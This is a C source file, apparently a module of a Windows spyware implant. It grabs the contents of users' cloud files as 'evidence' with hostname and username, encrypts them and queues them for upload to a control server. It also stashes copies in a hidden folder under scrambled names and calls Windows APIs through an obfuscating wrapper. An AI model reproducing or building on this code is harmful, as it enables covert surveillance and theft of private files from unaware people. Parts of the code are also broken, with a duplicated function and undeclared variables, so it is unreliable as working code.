#include <Windows.h>
#include "globals.h"
#include "log_cloudfile.h"
#include "proto.h"
#include "zmem.h"
#include "aes.h"
#include "sha1.h"
#include "utils.h"
#include "crypt.h"


#ifndef H4DLL_EXPORTS
	aes_context crypt_ctx;
	LOG_CLOUD_ENTRY_STRUCT g_log_table[MAX_LOG_ENTRIES];
#else
	#include "H4-DLL.h"
#endif


//add an entry to a logfile
BOOL LogCloud_ReportLog(DWORD agent_tag, BYTE *buff, DWORD buff_len)
{
	LPBYTE lpcEvBuffer=NULL;
	DWORD  dwEvSize;
	
	//encrypt the buffer
	lpcEvBuffer = PackEncryptEvidence(buff_len, buff, agent_tag, NULL, 0, &dwEvSize);
	znfree((LPVOID*)&buff);

	if(lpcEvBuffer == NULL)
		return LC_E_GENERIC;

	return LogCloud_QueueLog(agent_tag, lpcEvBuffer, dwEvSize);
}


//add a log to the log queue
BOOL LogCloud_QueueLog(DWORD agent_tag, BYTE *buff, DWORD buff_len)
{
	//check the size of the log buffer
	if(LogCloud_IsBufferFull(buff_len))
	{
		znfree(&buff);
		return LC_E_BUFFER_FULL;
	}

	for(int i=0; i<MAX_LOG_ENTRIES; i++)
	{
		if(g_log_table[i].dwSize == 0 || g_log_table[i].lpBuffer == NULL)
		{
			g_log_table[i].dwSize	= buff_len;
			g_log_table[i].lpBuffer	= buff;

			return LC_E_SUCCESS;
		}
	}

	#ifdef _DEBUG
	OutputDebugString(L"[!] Log buffer is full!");
	#endif	

	//delete the enctypted buffer
	znfree((LPVOID*)&buff);

	return LC_E_BUFFER_FULL;
}


//check if the structure has enough free bytes to tore the new evidence
BOOL LogCloud_IsBufferFull(DWORD dwNewEvidenceSize)
{
	DWORD dwTotSize=0, i;

	//loop to get the total size of the saved evidences
	for(i=0, dwTotSize=0; i<MAX_LOG_ENTRIES; i++)
		dwTotSize += g_log_table[i].dwSize;

	#ifndef H4DLL_EXPORTS
		if((dwTotSize + dwNewEvidenceSize) > MAX_CLOUD_FILE_SIZE)
		{
			#ifdef _DEBUG
				OutputDebugString(L"\r\n[LOG] The log buffer is FULL\r\n");				
				OutputDebugString(L"\r\n");
			#endif

			return TRUE;
		}
	#endif

	return FALSE;
}


//copy the file content in the log buffer
BOOL LogCloud_CopyFile(PGD_FILE pCloudFile, DWORD agent_tag)
{
	DWORD dwRet = 0;

	//vede se la dimensione e' consistente
	if (pCloudFile->dwFileSize == 0) 
		return LC_E_GENERIC;
	
	// Effettua la vera copia.	
	//if(LogCloud_CryptCopyBuffer(pCloudFile, agent_tag) != LC_E_SUCCESS) 
	return (LogCloud_CryptCopyBuffer_Hash(pCloudFile, agent_tag));
}


LPBYTE LogCloud_EncryptPayload(LPBYTE pIn, DWORD *pdwSize, DWORD dwChunkSize)
{
	DWORD i, dwEncLen=0, dwPayloadSize=0, dwAlignedChunk=0, dwExtraBytes=1024;

	if(pdwSize == NULL)
		return NULL;

	if(*pdwSize == 0)
		return NULL;

	if(pIn == NULL)
		return NULL;

	//align the size of the buffer
	DWORD dwAlignedSize = Align(*pdwSize, 16);
	dwAlignedChunk		= Align(dwChunkSize, 16);

	//add extra bytes to avoid reallocs (for each encrypt function call, 4 bytes are added to store the block len)
	LPBYTE pPayload = (LPBYTE)zalloc(dwAlignedSize + dwExtraBytes);
	if(pPayload == NULL)
		return NULL;

	LPBYTE pEncBuf=NULL, pChunk=NULL, pTmp=NULL;

	pChunk = pIn;
	pTmp   = pPayload;

	pEncBuf = (LPBYTE)malloc(dwAlignedChunk);
	if(pEncBuf == NULL)
	{
		znfree(&pPayload);
		return NULL;
	}

	//loop to encrypt the buffer according to the chunk size
	for(i=0, dwPayloadSize; i<*pdwSize; i+=dwAlignedChunk)
	{
		RtlSecureZeroMemory(pEncBuf, dwAlignedChunk);

		if((i + dwAlignedChunk) > *pdwSize)
		{			
			memcpy(pEncBuf, pChunk, (*pdwSize - i));

			dwAlignedChunk = Align((*pdwSize - i), 16);
		}
		else
			memcpy(pEncBuf, pChunk, dwAlignedChunk);		

		if((dwPayloadSize+dwAlignedChunk+4) > (dwAlignedSize+dwExtraBytes)) //4 bytes are for the size of the enctypted chunk (for each chunk)
		{
			//realloc the buffer
			dwAlignedSize = Align(dwPayloadSize+dwAlignedChunk, 16);

			if(LogCloud_ReallocBuf(&pPayload, dwAlignedSize+dwExtraBytes) != LC_E_SUCCESS)
			{
				znfree(&pPayload);
				znfree(&pEncBuf);
				return NULL;
			}

			pTmp  = pPayload;
			pTmp += dwPayloadSize;
		}

		//encrypt the buffer
		Encrypt(pEncBuf, dwAlignedChunk, pLogKey, PAD_NOPAD);

		*(LPDWORD)pTmp = dwAlignedChunk;
		pTmp += sizeof(DWORD);

		//copy the encrypted buffer to the payload
		memcpy(pTmp, pEncBuf, dwAlignedChunk);		

		pTmp	+= dwAlignedChunk;
		pChunk  += dwAlignedChunk;

		dwPayloadSize += (dwAlignedChunk + sizeof(DWORD));
	}
	
	//free mem
	znfree(&pEncBuf);

	*pdwSize = dwPayloadSize;

	return pPayload;
}


//copy the evidence packet and hash it so when the evidence is sent, no new buffer must be allocated again.
BOOL LogCloud_CryptCopyBuffer_Hash(PGD_FILE pCloudFile, DWORD agent_tag)
{
	pFileAdditionalData pAdditionalData=NULL;
	LPBYTE pBuf=NULL, pcHeaderData=NULL, pcEncHeader=NULL, pcPayload=NULL;
	DWORD  dwHeaderLen=0, dwPayloadSize=0, dwPacketSize=0, dwCmdSize=0, dwAlignedCmdSize=0;

	//check the buffer for available size
	if(LogCloud_IsBufferFull(pCloudFile->dwFileSize))
	{
		return LC_E_BUFFER_FULL;
	}
	
	dwPayloadSize = pCloudFile->dwFileSize;

	//encrypt the file buffer
	pcPayload = LogCloud_EncryptPayload(pCloudFile->pcFileBuf, &dwPayloadSize, CRYPT_COPY_BUF_LEN);	
	if(pcPayload == NULL)
		return LC_E_GENERIC;	
	znfree(&pCloudFile->pcFileBuf);

	//create the header to write in the file buffer
	pcHeaderData = (LPBYTE)malloc(sizeof(FileAdditionalData) + wcslen(pCloudFile->pwszFileName) * sizeof(WCHAR));
	if(pcHeaderData == NULL)
	{
		znfree(&pcPayload);
		return LC_E_ALLOC;
	}

	//create the log header
	pAdditionalData					= (pFileAdditionalData)pcHeaderData;
	pAdditionalData->uVersion		= LOG_FILE_VERSION;
	pAdditionalData->uFileNameLen	= wcslen(pCloudFile->pwszFileName) * sizeof(WCHAR);

	//copy the struct info to the header buffer
	memcpy(pAdditionalData+1, pCloudFile->pwszFileName, pAdditionalData->uFileNameLen);
	//create the log header (size + hostname + username + additional data) all encrypted but the first DWORD
	pcEncHeader = CreateLogHeader(agent_tag, pcHeaderData, pAdditionalData->uFileNameLen + sizeof(FileAdditionalData), &dwHeaderLen);
	znfree(&pcHeaderData);

	if(pcEncHeader == NULL)
	{
		znfree(&pcPayload);		
		return LC_E_GENERIC;
	}

	//size of the packet
	dwPacketSize = sizeof(DWORD) + dwHeaderLen + dwPayloadSize; //size of the evidence packet
	dwCmdSize	 = sizeof(DWORD) + dwPacketSize + 20;		    //size of the hashed cmd to send to server

	//align the size
	dwAlignedCmdSize = dwCmdSize;
	if(dwAlignedCmdSize % 16)
		dwAlignedCmdSize += 16 - (dwAlignedCmdSize % 16);
	else
		dwAlignedCmdSize += 16;

	//generate the packet
	LPBYTE pcPacket=NULL, pTmp=NULL;
	
	pcPacket = (LPBYTE)zalloc(dwAlignedCmdSize);
	if(pcPacket == NULL)
	{
		znfree(&pcPayload);
		znfree(&pcEncHeader);
		return LC_E_GENERIC;
	}

	pTmp = pcPacket;

	//command
	*(LPDWORD)pTmp = (DWORD)PROTO_EVIDENCE;
	pTmp += sizeof(DWORD);

	//packet size
	*(LPDWORD)pTmp = (DWORD)dwPacketSize;
	pTmp += sizeof(DWORD);

	//header
	memcpy(pTmp, pcEncHeader, dwHeaderLen);
	znfree(&pcEncHeader);
	pTmp += dwHeaderLen;

	//payload
	memcpy(pTmp, pcPayload, dwPayloadSize);
	znfree(&pcPayload);
	pTmp += dwPayloadSize;

	//hash the packet
	BYTE pSha1Digest[20];
	CalculateSHA1(pSha1Digest, pcPacket, dwCmdSize-20);
	memcpy(pTmp, pSha1Digest, 20);

	#ifdef _DEBUG
		OutputDebugString(L"\r\n[LOG] Logging cloud file\r\n");
		OutputDebugString(pCloudFile->pwszFileName);
		OutputDebugString(L"\r\n");
	#endif

	//queue the log with the cmd size and not the aligned size
	//because the SendEvidence_Encrypt have to encrypt the buffer content with that size.
	//The encryption cannot be done here because the session key is different for every sync
	return LogCloud_QueueLog(agent_tag, pcPacket, dwCmdSize);
}


//copy the log buffer obfuscating it
BOOL LogCloud_CryptCopyBuffer(PGD_FILE pCloudFile, DWORD agent_tag)
{
	pFileAdditionalData pAdditionalData=NULL;
	LPBYTE pcHeaderData=NULL, pcEncHeader=NULL,  pcPayload=NULL;
	DWORD  dwHeaderLen=0, dwPayloadSize=0, dwPacketSize=0;

	//check the buffer for available size
	if(LogCloud_IsBufferFull(pCloudFile->dwFileSize))
	{
		return LC_E_BUFFER_FULL;
	}
	
	dwPayloadSize = pCloudFile->dwFileSize;

	//encrypt the file buffer
	pcPayload = LogCloud_EncryptPayload(pCloudFile->pcFileBuf, &dwPayloadSize, CRYPT_COPY_BUF_LEN);
	if(pcPayload == NULL)
		return LC_E_GENERIC;
	znfree(&pCloudFile->pcFileBuf);

	//create the header to write in the file buffer
	pcHeaderData = (LPBYTE)malloc(sizeof(FileAdditionalData) + wcslen(pCloudFile->pwszFileName) * sizeof(WCHAR));
	if(pcHeaderData == NULL)
	{
		znfree(&pcPayload);
		return LC_E_ALLOC;
	}

	//create the log header
	pAdditionalData					= (pFileAdditionalData)pcHeaderData;
	pAdditionalData->uVersion		= LOG_FILE_VERSION;
	pAdditionalData->uFileNameLen	= wcslen(pCloudFile->pwszFileName) * sizeof(WCHAR);

	//copy the struct info to the header buffer
	memcpy(pAdditionalData+1, pCloudFile->pwszFileName, pAdditionalData->uFileNameLen);
	//create the log header (size + hostname + username + additional data) all encrypted but the first DWORD
	pcEncHeader = CreateLogHeader(agent_tag, pcHeaderData, pAdditionalData->uFileNameLen + sizeof(FileAdditionalData), &dwHeaderLen);
	znfree(&pcHeaderData);

	if(pcEncHeader == NULL)
	{	
		znfree(&pcEncHeader);
		znfree(&pcPayload);
		return LC_E_GENERIC;
	}

	//size of the packet
	dwPacketSize = sizeof(DWORD) + dwHeaderLen + dwPayloadSize;

	//generate the packet
	LPBYTE pcPacket=NULL, pTmp=NULL;
	
	pcPacket = (LPBYTE)malloc(dwPacketSize);
	pTmp = pcPacket;

	//packet size
	*(LPDWORD)pTmp = (DWORD)dwPacketSize;
	pTmp += sizeof(DWORD);

	//header
	memcpy(pTmp, pcEncHeader, dwHeaderLen);
	znfree(&pcEncHeader);
	pTmp += dwHeaderLen;	

	//payload
	memcpy(pTmp, pcPayload, dwPayloadSize);
	znfree(&pcPayload);

	//queue the log
	return LogCloud_QueueLog(agent_tag, pcPacket, dwPacketSize);
}

/*
//copy the log buffer obfuscating it - working
BOOL LogCloud_CryptCopyBuffer(PGD_FILE pCloudFile, DWORD agent_tag)
{
	FileAdditionalData *file_additiona_data_header=NULL;
	LPBYTE pBuf=NULL;
	LPBYTE file_additional_data=NULL;
	LPBYTE log_file_header=NULL, pTmpBuf=NULL;
	WCHAR  *to_display=NULL;
	DWORD  dwHeaderLen=0;

	LPBYTE pEncBuf = NULL;
	DWORD  dwCopiedSize=0, dwEncLen=0, i, dwWrSize, dwChunkSize;
	BOOL   bErr = FALSE;


	//check the size of the log buffer
	if(LogCloud_IsBufferFull(pCloudFile->dwFileSize))
	{
		return FALSE;
	}

	to_display = pCloudFile->pwszFileName;

	//create the header to write in the file buffer
	if(!(file_additional_data = (BYTE *)malloc(sizeof(FileAdditionalData) + wcslen(to_display) * sizeof(WCHAR))))
		return FALSE;

	file_additiona_data_header = (FileAdditionalData*)file_additional_data;
	file_additiona_data_header->uVersion = LOG_FILE_VERSION;
	file_additiona_data_header->uFileNameLen = wcslen(to_display) * sizeof(WCHAR);
	memcpy(file_additiona_data_header+1, to_display, file_additiona_data_header->uFileNameLen);

	//enctypt the evidence
	pEncBuf = PackEncryptEvidence(pCloudFile->dwFileSize, 
								  pCloudFile->pcFileBuf, 
								  agent_tag, 
								  file_additional_data, 
								  file_additiona_data_header->uFileNameLen + sizeof(FileAdditionalData), 
								  &dwEncLen);

	//free mem
	znfree(&pCloudFile->pcFileBuf);
	
	if(bErr == TRUE)
	{
		znfree(&pEncBuf);
		return FALSE;
	}

	//queue the log
	return LogCloud_QueueLog(agent_tag, pEncBuf, dwEncLen);
}
*/

/*
// Formatta il buffer per l'invio di un log
// Non usa PrepareCommand per evitare di dover allocare due volte la dimensione del file
LPBYTE LogCloud_PrepareBuffer(LPBYTE lpBuf, DWORD *pdwBufLen)
{
	SHA1Context sha;
	DWORD tot_len, pad_len, i;
	BYTE *buffer, *ptr;
	aes_context crypt_ctx;
	DWORD msg_len, bytes_left;
	BYTE iv[16];
	DWORD command = PROTO_EVIDENCE;
	HANDLE hfile;
	DWORD n_read;
	DWORD rand_pad_len = 0;

//	if(pdwBufLen)
//		*pdwBufLen = 0;

	rand_pad_len = (rand()%15)+1;

	msg_len = *pdwBufLen;

	//round size
	pad_len = tot_len = sizeof(DWORD)*2 + msg_len + SHA_DIGEST_LENGTH;
	tot_len/=16;
	tot_len++;
	tot_len*=16;
	pad_len = tot_len - pad_len;

	// alloca il buffer
	if(!(buffer = (BYTE *)malloc(tot_len + rand_pad_len))){
		CloseHandle(hfile);
		return NULL;
	}

	// scrive il buffer
	memset(buffer, pad_len, tot_len);
	ptr = buffer;
	memcpy(ptr, &command, sizeof(DWORD));
	ptr += sizeof(DWORD);
	memcpy(ptr, &msg_len, sizeof(DWORD));
	ptr += sizeof(DWORD);

	// copia il contenuto del file
	lpBuf += 4;
	memcpy(ptr, lpBuf, msg_len);

	//bytes_left = msg_len;
	//while (bytes_left > 0) {
	//	if (!ReadFile(hfile, ptr, bytes_left, &n_read, NULL) || n_read==0) {
	//		CloseHandle(hfile);
	//		return NULL;
	//	}
	//	ptr += n_read;
	//	bytes_left -= n_read;
	//}
	//CloseHandle(hfile);

	// Calcola lo sha1 sulla prima parte del buffer
	SHA1Reset(&sha);
	SHA1Input(&sha, buffer, sizeof(DWORD)*2 + msg_len);
	if (!SHA1Result(&sha)) {
		free(buffer);
		return NULL;
	}
	// ..lo scrive
	for (i=0; i<5; i++)
		sha.Message_Digest[i] = ntohl(sha.Message_Digest[i]);
	memcpy(ptr, sha.Message_Digest, sizeof(sha.Message_Digest));

	// cifra il tutto
	aes_set_key( &crypt_ctx, (BYTE *)pSessionKey, 128);
	memset(iv, 0, sizeof(iv));
	//aes_cbc_encrypt(&crypt_ctx, iv, buffer, buffer, tot_len);
	aes_cbc_encrypt_pkcs5(&crypt_ctx, iv, buffer, buffer, tot_len);
	//rand_bin_seq(buffer + tot_len, rand_pad_len);
	AppendRandomData(buffer + tot_len, rand_pad_len);

	if(pdwBufLen)
		*pdwBufLen = tot_len + rand_pad_len;

	return buffer;
}
*/


//realloc a buffer
BOOL LogCloud_ReallocBuf(LPBYTE *pOldBuf, DWORD dwNewSize)
{
	LPBYTE pTmp = NULL;

	//realloc the dest buffer to contain the new chunk
	pTmp = *pOldBuf;
	*pOldBuf = (LPBYTE)realloc(*pOldBuf, dwNewSize);
	if(*pOldBuf == NULL)
	{
		znfree(&pTmp);
		return LC_E_ALLOC;
	}

	return LC_E_SUCCESS;
}

#ifdef H4DLL_EXPORTS

DWORD LogCloud_WCharToMB(LPWSTR pIn, LPSTR* pOut)
{
	DWORD dwSize;

	//return the number of chars needed by dest buffer
	dwSize = FNC(WideCharToMultiByte)(CP_ACP, 0, pIn, -1, 0, 0, 0, 0);
	if(dwSize == 0)
		return LC_CONV_ERROR;

	//alloc dest buffer
	*pOut = (LPSTR)zalloc(dwSize);
	if(*pOut == NULL)
		return LC_ALLOC_ERROR;

	//conversion
	dwSize = FNC(WideCharToMultiByte)(CP_ACP, 0, pIn, -1, *pOut, dwSize, 0 , 0);
	if(dwSize == 0)
		return LC_CONV_ERROR;

	return LC_SUCCESS;
}

//copy the log buffer obfuscating it
BOOL Log_CryptCopyFile(WCHAR *src_path, char *dest_file_path, WCHAR *display_name, DWORD agent_tag)
{
	HANDLE hsrc, hdst;
	BY_HANDLE_FILE_INFORMATION dst_info;
	DWORD existent_file_size = 0;
	DWORD dwRead;
	BYTE *temp_buff;
	BYTE *file_additional_data;
	BYTE *log_file_header;
	FileAdditionalData *file_additiona_data_header;
	DWORD header_len;
	WCHAR *to_display;

	if (display_name)
		to_display = display_name;
	else
		to_display = src_path;

	// Crea l'header da scrivere nel file
	if ( !(file_additional_data = (BYTE *)malloc(sizeof(FileAdditionalData) + wcslen(to_display) * sizeof(WCHAR))))
		return FALSE;
	file_additiona_data_header = (FileAdditionalData *)file_additional_data;
	file_additiona_data_header->uVersion = LOG_FILE_VERSION;
	file_additiona_data_header->uFileNameLen = wcslen(to_display) * sizeof(WCHAR);
	memcpy(file_additiona_data_header+1, to_display, file_additiona_data_header->uFileNameLen);
	log_file_header = Log_CreateHeader(agent_tag, file_additional_data, file_additiona_data_header->uFileNameLen + sizeof(FileAdditionalData), &header_len);
	SAFE_FREE(file_additional_data);
	if (!log_file_header)
		return FALSE;
	
	// Prende le info del file destinazione (se esiste)
	hdst = FNC(CreateFileA)(dest_file_path, GENERIC_READ, FILE_SHARE_READ | FILE_SHARE_WRITE | FILE_SHARE_DELETE, NULL, OPEN_EXISTING, 0, NULL);
	if (hdst != INVALID_HANDLE_VALUE) {
		if (FNC(GetFileInformationByHandle)(hdst, &dst_info)) {
			existent_file_size = dst_info.nFileSizeLow;
		}
		CloseHandle(hdst);
	}

	if ( !(temp_buff = (BYTE *)malloc(CRYPT_COPY_BUF_LEN)) ) {
		SAFE_FREE(log_file_header);
		return FALSE;
	}

	hsrc = FNC(CreateFileW)(src_path, GENERIC_READ, FILE_SHARE_READ | FILE_SHARE_WRITE | FILE_SHARE_DELETE, NULL, OPEN_EXISTING, 0, NULL);
	if (hsrc == INVALID_HANDLE_VALUE) {
		SAFE_FREE(log_file_header);
		SAFE_FREE(temp_buff);
		return FALSE;
	}

	// Controlla che ci sia ancora spazio per scrivere su disco
	if ((log_free_space + existent_file_size)<= MIN_CREATION_SPACE) {
		SAFE_FREE(temp_buff);
		SAFE_FREE(log_file_header);
		CloseHandle(hsrc);
		return FALSE;
	}

	hdst = FNC(CreateFileA)(dest_file_path, GENERIC_WRITE, FILE_SHARE_READ, NULL, CREATE_ALWAYS, 0, NULL);
	if (hdst == INVALID_HANDLE_VALUE) {
		SAFE_FREE(log_file_header);
		SAFE_FREE(temp_buff);
		CloseHandle(hsrc);
		return FALSE;
	}
	// Se il file e' stato sovrascritto (e con successo) restituisce la quota disco
	// recuperata.
	log_free_space += existent_file_size;

	// Scrive l'header nel file
	if (!FNC(WriteFile)(hdst, log_file_header, header_len, &dwRead, NULL)) {
		CloseHandle(hsrc);
		CloseHandle(hdst);
		SAFE_FREE(log_file_header);
		SAFE_FREE(temp_buff);
		return FALSE;
	}
	if (log_free_space >= header_len)
		log_free_space -= header_len;
	SAFE_FREE(log_file_header);
	FNC(FlushFileBuffers)(hdst);

	// Cicla finche riesce a leggere (e/o a scrivere)
	LOOP {
		dwRead = 0;
		if (!FNC(ReadFile)(hsrc, temp_buff, CRYPT_COPY_BUF_LEN, &dwRead, NULL) )
			break;
		// La Log_WriteFile sottrae la quota disco di ogni scrittura
		// Esce perche' quando il file da leggere e' finito dwRead e' 0
		// e Log_WriteFile ritorna FALSE se gli fai scrivere 0 byte
		if (!Log_WriteFile(hdst, temp_buff, dwRead))
			break;
	}

	SAFE_FREE(temp_buff);
	CloseHandle(hsrc);
	CloseHandle(hdst);
	return TRUE;
}


//Copy the file in the hidden folder, hashing del path.
//Files with the same hashed path are ovrewritten.
BOOL LogCloud_CopyFile(PGD_FILE pCloudFile, DWORD agent_tag)
{
	HANDLE hfile;
	BY_HANDLE_FILE_INFORMATION src_info, dst_info;
	char red_fname[100];
	char log_wout_path[_MAX_FNAME];
	char dest_file_path[DLLNAMELEN];
	char dest_file_mask[DLLNAMELEN];
	char *scrambled_name;
	nanosec_time src_date, dst_date;
	FILETIME time_nanosec;
	//SYSTEMTIME system_time;
	WIN32_FIND_DATA ffdata;
	HANDLE hFind = INVALID_HANDLE_VALUE;
	

	//Vede se la dimensione e' consistente
	if (pCloudFile->dwFileSize == 0) 
		return FALSE;
	
	// fa lo SHA1 del path in red_fname
	SHA1Context sha;
	SHA1Reset(&sha);
	SHA1Input(&sha, (const unsigned char *)pCloudFile->pwszFileName, (DWORD)(wcslen(pCloudFile->pwszFileName)*2));
	if (!SHA1Result(&sha)) 
		return FALSE;

	memset(red_fname, 0, sizeof(red_fname));
	for (int i=0; i<(SHA_DIGEST_LENGTH/sizeof(int)); i++) 
		sprintf(red_fname+(i*8), "%.8X", sha.Message_Digest[i]);

	// Vede se ha gia' catturato questo file...
	_snprintf_s(log_wout_path, sizeof(log_wout_path), _TRUNCATE, "?LOGF%.4X%s*.log", agent_tag, red_fname);
	if ( ! (scrambled_name = LOG_ScrambleName2(log_wout_path, crypt_key[0], TRUE)) ) 
		return FALSE;	
	HM_CompletePath(scrambled_name, dest_file_mask);
	SAFE_FREE(scrambled_name);
	hFind = FNC(FindFirstFileA)(dest_file_mask, &ffdata);
	if (hFind != INVALID_HANDLE_VALUE) {
		//...se l'ha gia' catturato usa il vecchio nome
		HM_CompletePath(ffdata.cFileName, dest_file_path);
		FNC(FindClose)(hFind);
	} else {
		// ...altrimenti gli crea un nome col timestamp attuale
		FNC(GetSystemTimeAsFileTime)(&time_nanosec);
		//FNC(SystemTimeToFileTime)(&system_time, &time_nanosec);	
		_snprintf_s(log_wout_path, sizeof(log_wout_path), _TRUNCATE, "%.1XLOGF%.4X%s%.8X%.8X.log", log_active_queue, agent_tag, red_fname, time_nanosec.dwHighDateTime, time_nanosec.dwLowDateTime);
		if ( ! (scrambled_name = LOG_ScrambleName2(log_wout_path, crypt_key[0], TRUE)) ) 
			return FALSE;	
		HM_CompletePath(scrambled_name, dest_file_path);
		SAFE_FREE(scrambled_name);
	}

	// Prende le info del file destinazione (se esiste)
	hfile = FNC(CreateFileA)(dest_file_path, GENERIC_READ, FILE_SHARE_READ | FILE_SHARE_WRITE | FILE_SHARE_DELETE, NULL, OPEN_EXISTING, 0, NULL);
	if (hfile != INVALID_HANDLE_VALUE) {
		if (!FNC(GetFileInformationByHandle)(hfile, &dst_info)) {
			CloseHandle(hfile);
			return FALSE;
		}
		CloseHandle(hfile);

		// Compara le date dei due file (evita riscritture dello stesso file)
		src_date.hi_delay = src_info.ftLastWriteTime.dwHighDateTime;
		src_date.lo_delay = src_info.ftLastWriteTime.dwLowDateTime;
		dst_date.hi_delay = dst_info.ftLastWriteTime.dwHighDateTime;
		dst_date.lo_delay = dst_info.ftLastWriteTime.dwLowDateTime;
		if (!IsGreaterDate(&src_date, &dst_date)) 
			return FALSE;
	}

	// Effettua la vera copia.
	if (!LogCloud_CryptCopyFile(src_path, dest_file_path, display_name, agent_tag)) 
		return FALSE;

	return TRUE;
}

#endif